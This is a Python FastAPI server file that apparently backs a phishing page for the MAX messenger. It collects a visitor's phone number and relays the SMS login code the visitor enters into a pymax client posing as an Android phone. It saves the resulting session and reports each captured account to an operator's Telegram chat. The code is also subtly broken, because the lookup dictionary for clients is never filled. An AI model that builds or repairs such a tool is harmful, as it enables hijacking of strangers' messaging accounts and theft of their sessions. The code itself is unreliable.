# main.py
import asyncio
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pymax import Client
from pymax.api.session.payloads import MobileUserAgentPayload
from pymax.api.session.enums import DeviceType
from pymax.extra_config import ExtraConfig
from aiogram import Bot
import uvicorn
import os

app = FastAPI()
BOT_TOKEN = os.getenv("BOT_TOKEN", "ВАШ_ТОКЕН")
CHAT_ID = int(os.getenv("CHAT_ID", "123456789"))
bot = Bot(token=BOT_TOKEN)

pending_codes = {}

class WebSmsProvider:
    def __init__(self, phone: str):
        self.phone = phone
        self.future = asyncio.Future()
    
    async def get_code(self):
        pending_codes[self.phone] = self.future
        try:
            code = await asyncio.wait_for(self.future, timeout=120)
            return code
        except asyncio.TimeoutError:
            return None
        finally:
            pending_codes.pop(self.phone, None)

@app.get("/", response_class=HTMLResponse)
async def get_index():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.post("/api/send-code")
async def send_code(request: Request):
    data = await request.json()
    phone = data.get("phone")
    if not phone:
        return JSONResponse({"error": "Номер обязателен"}, status_code=400)
    
    provider = WebSmsProvider(phone)
    ua = MobileUserAgentPayload(
        device_type=DeviceType.ANDROID,
        app_version="25.12.13",
        os_version="13",
        timezone="Europe/Moscow",
        screen="1080x2400",
        device_name="SM-G998B",
        device_locale="ru_RU",
        header_user_agent="Mozilla/5.0 (Linux; Android 13)"
    )
    
    client = Client(
        phone=phone,
        work_dir="sessions",
        session_name=phone.replace("+", ""),
        extra_config=ExtraConfig(token=None),
        sms_code_provider=provider
    )
    
    async def start_auth():
        asyncio.create_task(client.start())
        while client.me is None:
            await asyncio.sleep(0.5)
    
    asyncio.create_task(start_auth())
    return JSONResponse({"success": True})

@app.post("/api/verify-code")
async def verify_code(request: Request):
    data = await request.json()
    phone = data.get("phone")
    code = data.get("code")
    
    future = pending_codes.get(phone)
    if not future:
        return JSONResponse({"error": "Сессия не найдена или истекло время"}, status_code=400)
    
    future.set_result(code)
    
    # Ждём авторизацию
    for _ in range(60):
        await asyncio.sleep(1)
        for phone_key, client_obj in client_instances.items():
            if phone_key == phone and client_obj.me:
                me = client_obj.me
                await bot.send_message(
                    CHAT_ID,
                    f"✅ Новый аккаунт MAX!\n\n📱 {phone}\n👤 {me.first_name} {me.last_name or ''}"
                )
                return JSONResponse({"success": True})
    
    return JSONResponse({"error": "Таймаут авторизации"}, status_code=400)

client_instances = {}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
